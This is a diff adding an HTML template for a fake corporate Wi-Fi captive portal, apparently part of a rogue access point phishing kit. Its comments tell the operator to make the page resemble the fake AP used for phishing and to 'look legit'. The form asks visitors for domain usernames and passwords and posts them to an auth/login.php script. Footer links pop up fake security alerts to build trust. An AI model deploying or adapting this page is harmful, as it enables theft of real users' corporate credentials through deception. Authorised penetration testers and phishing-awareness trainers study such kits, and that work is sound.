@@ -1,0 +1,85 @@
+<!--
+	-Modify this page to resemble the Fake AP you plan to go phishing with...
+	-Modify the auth/login.php script (line 59) to point to the website you plan to send targets to once authenticated
+-->
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="user-scalable=yes, width=1000px" />
+<title>Wi-Fi Access Point</title>
+<link rel='SHORTCUT ICON' href='./images/favicon.ico' type='image/x-icon' />
+
+<!-- Add styles to make this look legit! -->
+<style>
+</style>
+
+<head>
+<body>
+
+<div style="margin:auto;width:90%">
+<!--Header-->
+<table width="100%" style="background:#cccccc" id="bottom">
+<tr><td valign="middle" width="60%"><br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<img src="./images/[BANNER]" alt="[TARGET]" />
+</td><td valign="middle"><br />
+<strong><h3>Wi-Fi Corporate Access</h3></strong>
+</td></tr></table>
+<br />
+
+<!--Content-->
+<div>
+<!--<form method="post" action="./auth/login.php" name="login form">-->
+<form method="post" enctype="multipart/form-data" action="./auth/login.php" name="login">
+<center>
+<p>Welcome to the [TARGET] Secure Access Service</p>
+<p>Enter domain credentials to access the Internet</p><br />
+</center>
+<table border="0" style="margin:auto;width:20%">
+<tr><td align="center">
+Username:
+</td><td align="left">
+<input type="text" name="Username" placeholder="Domain\Username" />
+</td></tr>
+<tr><td align="center">
+Password:
+</td><td>
+<input type="password" name="Password" />
+</td></tr>
+<tr><td>
+</td></tr>
+<tr><td align="center">
+<input type="submit" value="Submit" class="button" />
+</td></tr>
+</table>
+</form>
+</div>
+</div>
+
+<!--Footer-->
+<br />
+<center>
+<div style="margin:auto;width:90%;background:#cccccc;vertical-align:top;white-space:nowrap;display:inline-block" id="top">
+<p><a href="#" class="footer" style="TextDecoration:none" onclick="alert('External links have been disabled for your protection')">
+&copy; 2015 [COMPANY], Inc. All Rights Reserved.</a>
+&nbsp;&nbsp;|&nbsp;&nbsp;
+<a href="#" class="footer" onclick="alert('External links have been disabled for your protection')">
+Contact</a>
+&nbsp;&nbsp;|&nbsp;&nbsp;
+<a href="#" class="footer" onclick="alert('External links have been disabled for your protection')">
+Privacy</a>
+&nbsp;&nbsp;|&nbsp;&nbsp;
+<a href="#" class="footer" onclick="alert('External links have been disabled for your protection')">
+Website</a>
+&nbsp;&nbsp;|&nbsp;&nbsp;
+<a href="#" class="footer" onclick="alert('External links have been disabled for your protection')">
+Feedback</a>
+&nbsp;&nbsp;|&nbsp;&nbsp;
+<a href="#" class="footer" onclick="alert('External links have been disabled for your protection')">
+More Info</a></p>
+</div>
+</center>
+
+</body>
+</html>
